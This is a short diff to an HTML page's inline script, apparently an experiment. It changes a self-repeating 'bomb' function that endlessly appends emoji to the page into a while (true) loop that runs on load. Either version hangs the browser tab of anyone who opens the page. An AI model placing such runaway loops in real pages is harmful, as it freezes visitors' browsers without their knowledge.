@@ -4,13 +4,17 @@
 </body>
 
 <script defer>
+  for (let i = 0; i < 100; i++) {
+    console.log("welp")
+  }
         // Your script code here
         console.log('DOM fully loaded and parsed');
       function bomb() {
       const e = document.createElement("span");
       e.textContent = "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥";
       document.body.appendChild(e);
-     Promise.resolve().then(bomb);
+     
     }
-  bomb()
+  while (true)
+    bomb()
 </script>
